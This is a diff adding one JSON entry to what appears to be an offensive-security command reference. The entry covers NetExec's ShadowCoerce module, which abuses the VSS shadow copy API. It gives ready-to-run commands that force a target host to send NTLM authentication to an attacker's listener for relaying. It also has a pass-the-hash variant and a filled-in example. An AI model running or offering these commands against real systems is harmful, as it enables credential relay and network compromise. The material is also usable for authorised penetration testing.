@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-shadowcoerce",
+  "name": "NetExec SMB ShadowCoerce",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M shadowcoerce -o LISTENER=<listener_ip>",
+  "description": "Coerce NTLM authentication via the VSS shadow copy API (ShadowCoerce)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "shadowcoerce",
+    "vss",
+    "ntlm-relay",
+    "coerce"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M shadowcoerce -o LISTENER=<listener_ip>"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M shadowcoerce -o LISTENER=192.168.1.50"
+  ]
+}
